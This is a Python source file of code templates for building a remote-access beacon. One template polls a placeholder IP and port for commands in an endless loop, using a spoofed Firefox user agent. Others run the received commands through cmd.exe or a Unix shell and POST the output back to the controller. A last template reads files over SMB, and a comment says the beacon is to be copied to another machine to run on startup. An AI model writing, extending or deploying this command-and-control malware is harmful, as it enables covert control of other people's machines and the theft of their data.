# This is the base for executing Windows commands
WINCMDEXEC = '''
def GENERATEFUNC1(beacon_command):
    import subprocess
    command = ['cmd.exe', '/c', beacon_command]
    process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    out = out.decode()
    requests.post('http://REPLACEIP:REPLACEPORT/schema', data=out, headers=headers)
'''

# This is the base for constructing our beacon
BASE = '''
while 1:
    import requests
    import time
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (platform; rv:58) Gecko/geckotrail Firefox/90'
        # Set our UA to firefox
    }
    
    a = requests.get('REPLACEIP:REPLACEPORT', headers=headers)
    cmd = a.text


    time.sleep(REPLACESLEEPINT)

'''

# Base for executing Nix commands
NIXCMDEXEC = '''
def GENERATEFUNC1(beacon_command):
    import subprocess
    command = [beacon_command]
    process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    out = out.decode()
    requests.post('http://REPLACEIP:REPLACEPORT/schema', data=out, headers=headers)
'''

# The intention here is that you would copy this to another machine to execute on startup
WINREMOTECOPY = '''
def GENERATEFUNC2(full_path):
    import urllib
    from smb.SMBHandler import SMBHandler
    opener = urllib.request.build_opener(SMBHandler)
    fh = opener.open(full_path)
    data = fh.read()
    fh.close()

'''